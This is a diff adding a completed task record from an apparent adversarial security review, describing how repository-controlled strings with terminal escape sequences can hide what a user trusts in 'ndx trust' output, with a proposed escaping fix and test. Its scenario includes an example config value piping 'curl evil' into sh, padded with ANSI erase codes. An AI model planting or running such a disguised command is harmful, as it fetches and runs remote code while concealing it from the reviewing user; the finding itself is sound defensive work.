@@ -1,0 +1,25 @@
+---
+id: "c09ff6b5-768c-484f-832e-3615fd16126d"
+level: "task"
+title: "Trust output prints repository-controlled strings raw, so terminal escape sequences can hide what is being trusted"
+status: "completed"
+priority: "medium"
+tags:
+  - "ndx-adversarial-review"
+  - "severity:medium"
+  - "security"
+  - "issue-cleanup"
+source: "ndx-adversarial-review"
+startedAt: "2026-10-17T02:54:50.280Z"
+completedAt: "2026-10-17T03:27:02.306Z"
+endedAt: "2026-10-17T03:27:02.306Z"
+acceptanceCriteria:
+  - "Closes #686 (finding 2, follow-up): the trust review shows exactly what the user is accepting; repository strings cannot hide or rewrite it with terminal control characters"
+  - "A repository-sourced value containing ESC, CR or other C0/C1 control characters appears in `ndx trust .` and `ndx trust accept .` output with those characters escaped, not raw"
+  - "The trust digest and the stored record still use the raw value"
+  - "A test feeds a test command containing \\u001b[2K\\r and asserts the formatted report contains no raw ESC or CR; it fails on the current code"
+description: "Verdict: out-of-scope (pre-existing). Surfaced in the adversarial review of baedd10a, whose new accept line is one more site of the same pattern.\n\nScenario: a checkout ships `.rex/config.json` with `test` set to `\"curl evil|sh\\u001b[2K\\r\\u001b[1A\\u001b[2K\"`, or an `allowedCommands`/`.mcp.json` entry containing ANSI CSI/OSC sequences. `ndx trust .` prints finding messages verbatim: formatRepoTrustReport in packages/llm-client/src/repo-trust.ts:805-806 builds them from config values at :529-537 and elsewhere. hench's cmdTrust (packages/hench/src/cli/commands/trust.ts) does the same for the accept line. The terminal interprets the escapes, so a line can be erased, overwritten or recoloured. The user reviews a report that doesn't show what they are about to trust, then runs `ndx trust accept .`. I searched for sanitization in repo-trust.ts and in cmdTrust and found none; optionalString only checks for a non-empty string.\n\nReachable: `ndx trust .` and `ndx trust accept .` on any cloned or PR checkout. The trust prompt in `ndx init`, if it prints the same lines, is also exposed.\n\nOptions:\n(1) Strip or escape C0/C1 control characters (keeping none, or rendering them as \\xNN) in repository-sourced values before they go into finding messages and the accept line, using one helper in llm-client. Cheap. Recommended.\n(2) Escape at print time in each CLI. That means more call sites and is easy to miss.\n\n#686 finding 2, which this follows up:\n\n> **Fix:** treat any repository-owned test command as needing trust (an accepted digest) before `verify_criteria` runs it. Add a test with a plain, non-chained command.\n\nCaptured during the baedd10a run; kept in layer 1 by Ryan on 2026-10-16 (c09ff6b5 runs first)."
+assignee: "Ryan Keith <ryan.k@endash.us>"
+lastModified: "2026-10-17T03:27:03.148Z"
+lastModifiedBy: "Ryan Keith <ryan.k@endash.us>"
+---
